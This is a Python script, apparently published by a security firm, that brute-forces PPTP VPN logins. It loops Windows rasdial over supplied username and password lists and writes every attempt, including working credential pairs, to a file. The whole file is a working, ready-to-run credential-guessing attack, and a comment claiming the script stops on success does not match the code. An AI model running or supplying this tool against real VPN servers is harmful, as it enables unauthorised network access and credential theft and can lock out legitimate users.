import subprocess
import argparse
import sys

# Script banner.
def print_banner():
    banner = """ █████╗ ██████╗  █████╗ ██████╗  █████╗ ███╗   ██╗ █████╗ 
██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔══██╗████╗  ██║██╔══██╗
███████║██████╔╝███████║██║  ██║███████║██╔██╗ ██║███████║
██╔══██║██╔═══╝ ██╔══██║██║  ██║██╔══██║██║╚██╗██║██╔══██║
██║  ██║██║     ██║  ██║██████╔╝██║  ██║██║ ╚████║██║  ██║
╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝
https://www.amnafzar.net/\n"""
    print(banner)
    
    
def establish_vpn_connection(connection_name, username, password, output_file):
    try:
        # Define the command for rasdial to connect to the VPN
        command = ['rasdial', connection_name, username, password]
        # Execute the command
        result = subprocess.run(command, capture_output=True, text=True)
        
        # Check if the command was successful
        if result.returncode == 0:
            success_message = f"[*] Successful VPN connection! {username}:{password}"
            print(success_message)
            with open(output_file, 'a') as file:
                file.write(success_message + '\n')
            
            # Disconnect from VPN and stop the script
            disconnect_vpn(connection_name)

        else:
            error_message = f"[!] Failed to establish VPN connection - {username}:{password}"
            print(error_message)
            with open(output_file, 'a') as file:
                file.write(error_message + '\n')
    
    except Exception as e:
        error_message = f"An error occurred while trying to establish the VPN connection: {str(e)}"
        print(error_message)
        with open(output_file, 'a') as file:
            file.write(error_message + '\n')

def disconnect_vpn(connection_name):
    try:
        # Define the command to disconnect from the VPN
        command = ['rasdial', connection_name, '/disconnect']
        # Execute the command
        result = subprocess.run(command, capture_output=True, text=True)
        
        if result.returncode == 0:
            print(f"Disconnected from VPN: {connection_name}")
        else:
            print(f"Failed to disconnect from VPN: {result.stderr.strip()}")
    
    except Exception as e:
        print(f"An error occurred while trying to disconnect from the VPN: {str(e)}")

def main():
    parser = argparse.ArgumentParser(description="PPTP Brute-Forcer By @apadanasecure")
    parser.add_argument('-c', '--connection', required=True, help="The name of the VPN connection")
    parser.add_argument('-u', '--username', required=False, help="The username for the VPN connection")
    parser.add_argument('-l', '--list', required=False, help="Path to the file containing the list of usernames")
    parser.add_argument('-p', '--password-file', required=True, help="Path to the file containing the list of passwords")
    parser.add_argument('-o', '--output', required=True, help="Path to the file where results will be saved")
    
    args = parser.parse_args()
    
    try:
        with open(args.password_file) as file:
            password_list = [password.strip() for password in file.readlines()]
    except FileNotFoundError:
        print(f"Password file {args.password_file} not found.")
        return

    if args.list:
        try:
            with open(args.list) as file:
                username_list = [username.strip() for username in file.readlines()]  
        except FileNotFoundError:
            print(f"Password file {args.password_file} not found.")
            return
    # We have just one username
    else:    
        if(not args.username):
            print(f"[!] You should provide at least one username. (try -u/--username OR -l/--list)")
            sys.exit(0)
        username_list = [args.username]
    for username in username_list:
        for password in password_list:
            establish_vpn_connection(args.connection, username, password, args.output)

if __name__ == "__main__":
    print_banner()
    main()
